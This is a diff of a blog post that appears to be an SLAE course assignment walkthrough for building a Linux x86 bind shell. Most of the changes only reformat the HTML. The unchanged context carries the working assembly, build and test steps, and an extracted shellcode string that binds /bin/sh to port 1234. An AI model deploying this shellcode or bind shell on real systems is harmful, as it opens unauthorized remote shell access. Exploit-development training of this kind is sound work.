@@ -74,14 +74,18 @@ dup2()
 execve()
 </pre>
 
-The above system calls except **execve** and **dup2** are socket system calls and they are referenced with **socketcall** which is a common kernel entry point. Before moving further, the following steps are mentioned in order to construct the bind connection to the client as follows
+<p style="text-align:justify;">
+The above system calls except **execve** and **dup2** are socket system calls and they are referenced with **socketcall** which is a common kernel entry point. Before moving further, the following steps are mentioned in order to construct the bind connection to the client as follows:
+</p>
 
 - create a socket
 - bind socket to address and port
 - listen for connections
 - accept connection
 
+<p style="text-align:justify;">
 The steps above providing a footprint to further build the bind shellcode. Furthermore, the different numbers assigned to each socket system calls must be searched in order to use them in each step. The following image shows the numbers used for the needed socket system calls
+</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 <span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment1</b></span># cat /usr/include/linux/net.h | grep SYS
@@ -107,7 +111,10 @@ The steps above providing a footprint to further build the bind shellcode. Furth
 #define SYS_SENDMMSG 20 /* sys_sendmmsg(2) */
 </pre>
 
+
+<p style="text-align:justify;">
 There are several types of sockets, although stream sockets and datagram sockets are the most commonly used. The types of sockets are also defined for example in Ubuntu 12.04 inside the file /usr/include/i386-linux-gnu/bits/socket.h .The following output shows the assigned values at the stream and datagram sockets accordingly
+</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 <span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment1</b></span># cat /usr/include/i386-linux-gnu/bits/socket.h | grep SOCK_
@@ -131,7 +138,9 @@ SOCK_NONBLOCK = 04000 /* Atomically mark descriptor(s) as
 #define SOCK_NONBLOCK SOCK_NONBLOCK
 </pre>
 
-Proceeding further, it is time to create the **bind.nasm** file. Before starting to write the **bind** shell in assembly, the registers **eax** , **ebx, edi** and **edx** will be zeroed out
+<p style="text-align:justify;">
+Proceeding further, it is time to create the <b>bind.nasm</b> file. Before starting to write the <b>bind</b> shell in assembly, the registers <b>eax</b> , <b>ebx, edi</b> and <b>edx</b> will be zeroed out
+</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 global _start
@@ -152,16 +161,20 @@ xor edi, edi
 int socketcall(int call, unsigned long *args);
 ```
 
-The **call** argument determines which **socket** function to invoke.&nbsp;_ **args&nbsp;** _points to a block containing the actual arguments, which are passed through to the appropriate call. In this case, the **socketcall** system call identifier will be determined first and afterwards the **socket** system calls ( SYS\_SOCKET, SYS\_BIND, SYS\_LISTEN, SYS\_ACCEPT ) will be called through the **call** instruction in assembly.
+<p style="text-align:justify;">
+The <b>call</b> argument determines which <b>socket</b> function to invoke. The <b>args</b> points to a block containing the actual arguments, which are passed through to the appropriate call. In this case, the <b>socketcall</b> system call identifier will be determined first and afterwards the <b>socket</b> system calls ( SYS_SOCKET, SYS_BIND, SYS_LISTEN, SYS_ACCEPT ) will be called through the <b>call</b> instruction in assembly.
+</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 <span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment1</b></span># cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socketcall 
 #define __NR_socketcall 102
 </pre>
 
-As seen above, the **socketcall** can be called using the defined identifier **102** which is **0x66** in hex. Before moving further in x86 assembly, a very important aspect of the language compilation must be mentioned, which is the calling convention.
+<p style="text-align:justify;">
+As seen above, the <b>socketcall</b> can be called using the defined identifier <b>102</b> which is <b>0x66</b> in hex. Before moving further in x86 assembly, a very important aspect of the language compilation must be mentioned, which is the calling convention.
 
 In x86 Linux systems the system calls parameters are passed into the stack using the following registers
+</p>
 
 - **eax** used to hold the system call number. Also used to hold the return value from the stack
 - **ecx, edx, ebx, esi, edi, ebp** are used to pass 6 parameter arguments to system call functions
@@ -195,7 +208,10 @@ mov edi, eax  ; EAX will store the return value of the socket
               ; EAX register must be used with other syscalls too
 </pre>
 
+
+<p style="text-align:justify;">
 After the socket creation, the next step is to bind the IP address of the target machine as well as a free local port on that machine to the socket descriptor **sockfd**. Also, a port must be chosen that is unlikely to be used by any service at the target machine ( e.g. 1234 ). In order to accomplish the binding , the following system call will be used.
+</p>
 
 ### Bind Function Synopsis
 
@@ -233,7 +249,10 @@ mov ecx, esp    ; point ECX at the top of the stack
 int 0x80        ; call syscall interrupt to execute the arguments
 </pre>
 
+
+<p style="text-align:justify;">
 As seen at the code above, the port number in hex format has been pushed into the stack after it was transformed in network byte order. That happened because ports and addresses are always specified in calls to the socket functions using the network byte order convention. This convention is a method of sorting bytes independently of specific machine architectures. The following python script does the network byte convention and then transforms the decimal value into hex in order to use it when the port pushed on the stack
+</p>
 
 ```python
 !/usr/bin/python 
@@ -263,7 +282,9 @@ Port in hex Network Byte order: 0xd204
 int listen(int sockfd, int backlog);
 ```
 
-After binding the **sockfd** to the target IP and PORT, a listen method must be initiated in order to start listening for connections.
+<p style="text-align:justify;">
+After binding the <b>sockfd</b> to the target IP and PORT, a listen method must be initiated in order to start listening for connections.
+</p>
 
 ### Listen:
 
@@ -292,9 +313,13 @@ int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
 int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
 ```
 
-After the **listen** system call, the **accept** system call must be called in order to create a new accepted socket and then return the new descriptor referring to that socket. The argument **addr** is a pointer to **sockaddr** structure. The argument **sockfd** is the socket descriptor that was created using the **socket** system call and is bound to a local address using **bind** system call after it listens for connections using l **isten** system call.
+<p style="text-align:justify;">
+After the <b>listen</b> system call, the <b>accept</b> system call must be called in order to create a new accepted socket and then return the new descriptor referring to that socket. The argument <b>addr</b> is a pointer to **sockaddr** structure. The argument <b>sockfd</b> is the socket descriptor that was created using the <b>socket</b> system call and is bound to a local address using <b>bind</b> system call after it listens for connections using <b>listen</b> system call.
+</p>
 
-The **accept4** &nbsp;system call is available starting with **Linux 2.6.28** ; support in glibc is available starting with version **2.10**
+<p style="text-align:justify;">
+The <b>accept4</b> system call is available starting with <b>Linux 2.6.28</b> ; support in glibc is available starting with version <b>2.10</b>
+</p>
 
 ### Accept:
 
@@ -317,7 +342,9 @@ int 0x80         ; call syscall interrupt to execute the arguments
 int dup2(int oldfd, int newfd);**
 ```
 
-After initiating the **accept** system call, there must be a redirection from standard input, output and error descriptors to the client descriptor returned from **accept** syscall. This has to be done in order to be able to initiate commands in a shell environment at the target machine. The following description has been taken from Linux manual page: The **dup2** system call performs the same task as **dup** , but instead of using the lowest-numbered unused file descriptor, it uses the file descriptor number specified in **newfd**. If the file descriptor **newfd** was previously open, it is silently closed before being reused.
+<p style="text-align:justify;">
+After initiating the <b>accept</b> system call, there must be a redirection from standard input, output and error descriptors to the client descriptor returned from <b>accept</b> syscall. This has to be done in order to be able to initiate commands in a shell environment at the target machine. The following description has been taken from Linux manual page: The <b>dup2</b> system call performs the same task as <b>dup</b> , but instead of using the lowest-numbered unused file descriptor, it uses the file descriptor number specified in <b>newfd</b>. If the file descriptor <b>newfd</b> was previously open, it is silently closed before being reused.
+</p>
 
 ### Dup2 :&nbsp; 
 
@@ -336,7 +363,10 @@ jle lo            ; loop until counter is less or equal to 2
 
 ### Execve Function Synopsis
 
+
+<p style="text-align:justify;">
 Now that the standard input, output and error are pointing to 0,1,2 file descriptors, the run the execve function will be run in order to execute the /bin/sh command to the target host.
+</p>
 
 ```c
 #include <unistd.h> 
@@ -361,7 +391,10 @@ mov al, 0xb     ; 0xb indicates the execve syscall
 int 0x80        ; execute execve syscall**
 </pre>
 
-As just shown, the **/bin/sh** string is pushed onto the stack in reverse order by first pushing the terminating null value of the string, and then pushing the **//sh (4 bytes are required for alignment and the second / has no effect)**, and finally pushing the /bin onto the stack. At this point, we have all that we need on the stack, so **esp** now points to the location of /bin/sh.
+
+<p style="text-align:justify;">
+As just shown, the <b>/bin/sh</b> string is pushed onto the stack in reverse order by first pushing the terminating null value of the string, and then pushing the <b>//sh (4 bytes are required for alignment and the second / has no effect)</b>, and finally pushing the /bin onto the stack. At this point, we have all that we need on the stack, so <b>esp</b> now points to the location of /bin/sh.
+</p>
 
 Then, the following commands will be used in order to compile and link the code.
 
@@ -376,7 +409,10 @@ Furthermore, the bind program runs as follows
 <span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment1</b></span># ./bind
 </pre>
 
-Then from **netstat** tool can be seen that the target machine listens to port **1234** &nbsp;and waits for an incoming connection.
+
+<p style="text-align:justify;">
+Then from <b>netstat</b> tool can be seen that the target machine listens to port <b>1234</b> and waits for an incoming connection.
+</p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
 <span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment1</b></span># netstat -antp | grep 1234 tcp 0 0 0.0.0.0:1234 0.0.0.0:\* LISTEN 1193/./bind
@@ -398,7 +434,9 @@ Furthermore, the shellcode will be created using the following command
 <span style="color:#cd0000;"><b>root@kali</b></span>:<span style="color:#a7a7f3;"><b>~/Documents/SLAE/Assignment1</b></span># objdump -d ./bind|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' "\x31\xc0\x31\xdb\x31\xd2\x31\xf6\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\xb0\x66\xfe\xc3\x52\x66\x68\x04\xd2\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x52\x56\x89\xe1\x83\xc3\x02\xb0\x66\xcd\x80\xb0\x66\xfe\xc3\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\x80\xf9\x02\x7e\xf6\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
 </pre>
 
+<p style="text-align:justify;">
 The following code utilizes the shellcode created from the assembly code above. The program initializes a custom port number to the target host.
+</p>
 
 ```c
 #include <sys/socket.h> 
